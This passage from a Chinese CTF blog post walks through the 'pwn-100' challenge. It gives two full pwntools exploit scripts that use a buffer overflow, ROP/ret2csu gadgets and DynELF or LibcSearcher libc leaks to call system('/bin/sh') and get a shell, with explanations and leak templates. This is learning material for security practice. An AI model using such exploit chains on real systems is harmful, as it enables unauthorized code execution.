class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;111.200.241.244&#39;,62525)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn-100&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn-100&#39;)</span><br><span class="line">#context(log_level&#x3D;&#39;debug&#39;,os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">puts_addr &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_addr &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line"></span><br><span class="line">start_addr &#x3D; 0x4006B8</span><br><span class="line">pop_rdi &#x3D; 0x400763 </span><br><span class="line">gadget &#x3D; 0x40075A</span><br><span class="line">mov_call &#x3D; 0x400740</span><br><span class="line">bss_addr &#x3D; 0x601000 </span><br><span class="line"></span><br><span class="line">def leak(addr):						--这里用到的是一个DynELF模板</span><br><span class="line">    up &#x3D; &#39;&#39;     					--这里我们是为了接下来的接收能够不会错误</span><br><span class="line">    content &#x3D; &#39;&#39;</span><br><span class="line">    payload &#x3D; &#39;A&#39;*0x48</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)  </span><br><span class="line">    payload +&#x3D; p64(addr)</span><br><span class="line">    payload +&#x3D; p64(puts_addr)</span><br><span class="line">    payload +&#x3D; p64(start_addr)</span><br><span class="line">    payload &#x3D; payload.ljust(200, &#39;B&#39;)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">    while True: </span><br><span class="line">        c &#x3D; p.recv(numb&#x3D;1, timeout&#x3D;0.1)			--接收后等待一会，防止少接收，漏接收。</span><br><span class="line">        if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;:				--但接收到上一行是回车，且接收本行的内容为空</span><br><span class="line">            content &#x3D; content[:-1]+&#39;\x00&#39;</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            content +&#x3D; c</span><br><span class="line">            up &#x3D; c</span><br><span class="line">    content &#x3D; content[:4]</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;elf)</span><br><span class="line">system_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;A&quot;*0x48</span><br><span class="line">payload +&#x3D; p64(gadget)			--这里用到了通用的ROP</span><br><span class="line">payload +&#x3D; p64(0)					--rbx&#x3D;&#x3D;0</span><br><span class="line">payload +&#x3D; p64(1)					--rbp&#x3D;&#x3D;1</span><br><span class="line">payload +&#x3D; p64(read_addr)			--r12&#x3D;&#x3D;调用read函数</span><br><span class="line">payload +&#x3D; p64(8)					--r13&#x3D;&#x3D;8--&gt;rdx&#x3D;8--&gt;read的第三个参数为8，即写入的大小为8</span><br><span class="line">payload +&#x3D; p64(bss_addr)			--r14&#x3D;&#x3D;bss段的地址--&gt;rsi&#x3D;&#x3D;bss即read的第二个参数为bss，也就是在bss段中写入</span><br><span class="line">payload +&#x3D; p64(0)					--r15&#x3D;&#x3D;0--&gt;rdi&#x3D;&#x3D;0即read的第一个参数为0，标准输入流</span><br><span class="line">payload +&#x3D; p64(mov_call)		    </span><br><span class="line">payload +&#x3D; &#39;\x00&#39;*56				--我等等详细讲</span><br><span class="line">payload +&#x3D; p64(start_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;B&quot;)	--padding,达到填充目的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;bye~\n&#39;)</span><br><span class="line">payload &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;					--这里我也不是很懂，我觉得就是执行刚刚的read吧</span><br><span class="line">p.send(payload)</span><br><span class="line">#p.send(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;A&quot;*72				</span><br><span class="line">payload +&#x3D; p64(pop_rdi)				--使得system调用时的参数为bss中刚刚写入的&#x2F;bin&#x2F;sh\x00</span><br><span class="line">payload +&#x3D; p64(bss_addr)		</span><br><span class="line">payload +&#x3D; p64(system_addr)		</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;B&quot;)	</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="通用rop"><a href="#通用rop" class="headerlink" title="通用rop"></a>通用rop</h1><p>到目前所知，每个程序中或多或少都有一段通用的rop链可以使用：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722141946752.png?raw=true" alt="image-20210722141946752.png"></p>
<p>我们将其分为三部分：</p>
<p>1.我们发现我们可以通过这一部分控制很多寄存器的值，那么这就有利用我们后面的利用。</p>
<p>2.在2中我们发现1中控制的值还可以再次控制rdi,rsi,rdx这三个寄存器（想想64位的传参我们就可以想到，如果调用函数的话就可以控制他们的前三个参数了），并且这里还存在一个call的跳转。</p>
<p>3.这里我之前一直没有看直到现在我才发现它的奥妙，这里也是为什么EXP中要填写’\x00’*56的原因了。</p>
<p>这里会对rbx和rbp的值进行一个比较，如果不相等就会跳转到自己的开头再次进行。那我们肯定不能让他这样循环，于是我们需要使得rbx==rbp，但我们又需要控制call的跳转目的地，那么rbx必须为0。并且这里会进行一次rbx+1，那么也就是说我们只要使得rbp=1即可达成条件。那么我们通过4来讲讲为什么要又’\x00’。</p>
<p>4.我们直到汇编语言的流程是一直向下进行的，也就是说当我们满足条件之后又会进行6次pop，但这时候我们已经不需要再控制什么了，那么我们就随便填充点什么，并且这里有7行的内容那么再64位中*<em>7</em>8==56**，所以我们填充完后进行到ret，我们为了下一次的进行所以用main_addr来覆盖ret。最后防止输入的小于200，进行了填充。</p>
<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><p>利用LibcSearcher库：</p>
<p>EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p&#x3D;remote(&#39;111.200.241.244&#39;,60962)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn-100&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn-100&#39;)</span><br><span class="line">bss &#x3D; 0x601000</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400763	</span><br><span class="line">main_addr &#x3D; 0x4006B8</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x48 + p64(pop_rdi) + p64(read_got) + p64(puts_plt)+p64(main_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200,&#39;a&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;bye~\x0a&#39;)</span><br><span class="line">read_addr &#x3D; u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39; * 0x40 + &#39;A&#39; * 8 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr) </span><br><span class="line">payload &#x3D; payload.ljust(200,&#39;a&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我个人觉得法二更适合我，法一的内容我直接用模板使得我不是很理解，但我觉得法一它的有点就是可以在接收的时候能更有效率，法二的话需要一次次调试接收。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.对比DynELF和LibcSearcher库方法，我认为LibcSearcher库的运行速度更快，并且可以获得到bin/sh这类字符的地址，能更快速的解题。</p>
<p>2.对于接收字符的理解:对于recv[a: b :c]</p>
<p>a:表示接收的开始位置</p>
<p>b:表示接收的结束位置</p>
<p>c:表示步长，也就是接收的间隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg：s &#x3D; &#39;abcdefg&#39;</span><br><span class="line">print(s[0])						--a</span><br><span class="line">print(s[1:4])					--bcd</span><br><span class="line">print(s[-2])					--f</span><br><span class="line">print(s[-1:1:-1])				--gfedc</span><br></pre></td></tr></table></figure>

<p>注意事项：我们从eg中可以看出这是个<strong>左闭右开</strong>的区间</p>
<p>3.如何找出可写段的地址：</p>
<p>利用gdb+文件名–&gt;run–&gt;ctrl+c–&gt;vmmap</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722144234638.png?raw=true" alt="image-20210722144234638.png"></p>
<p>在gdb中我们可以看到第三个的开头就是bss可写段的首地址。</p>
<p>4.DynELF模板</p>
<p>puts完没有输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  data &#x3D; &#39;&#39;</span><br><span class="line">  payload &#x3D; xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&#39;xxx\n&#39;) #一定要在puts前释放完输出</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c &#x3D; p.recv(numb&#x3D;1, timeout&#x3D;1)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;:  </span><br><span class="line">      buf &#x3D; buf[:-1]             </span><br><span class="line">      buf +&#x3D; &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf +&#x3D; c</span><br><span class="line">    up &#x3D; c</span><br><span class="line">  data &#x3D; buf[:4]  </span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>

<p>puts完还有输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  data &#x3D; &quot;&quot;</span><br><span class="line">  payload &#x3D; xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&quot;xxx\n&quot;)) #一定要在puts前释放完输出</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c &#x3D; p.recv(1)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;x&quot;:  #一定要找到泄漏信息的字符串特征</span><br><span class="line">      data &#x3D; buf[:-1]                     </span><br><span class="line">      data +&#x3D; &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf +&#x3D; c</span><br><span class="line">    up &#x3D; c</span><br><span class="line">  data &#x3D; buf[:4] </span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>模板：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/86689760">https://blog.csdn.net/qq_40827990/article/details/86689760</a></p>
<p>方法：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qy201706/article/details/105934804">https://blog.csdn.net/qy201706/article/details/105934804</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/07/22/DynELF%E5%92%8CLibcSearch/">http://example.com/2021/07/22/DynELF%E5%92%8CLibcSearch/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/24/gf-stack-2/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">gf-stack_2</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/15/gf715/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">gf715</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>